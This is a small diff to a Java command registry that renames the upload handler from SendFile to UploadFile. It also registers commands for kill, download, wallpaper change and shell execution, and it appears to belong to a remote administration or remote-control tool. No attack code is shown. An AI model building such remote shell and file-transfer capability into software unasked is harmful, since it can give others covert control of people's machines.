@@ -13,7 +13,7 @@ public class Commands {
 
 		Command.add("echo", Echo.class);
 		Command.add("kill", Kill.class);
-		Command.add("ul", SendFile.class);
+		Command.add("ul", UploadFile.class);
 		Command.add("dl", DownloadFile.class);
 		Command.add("wallpaper", Wallpaper.class);
 		Command.add("exec", ShellExec.class);
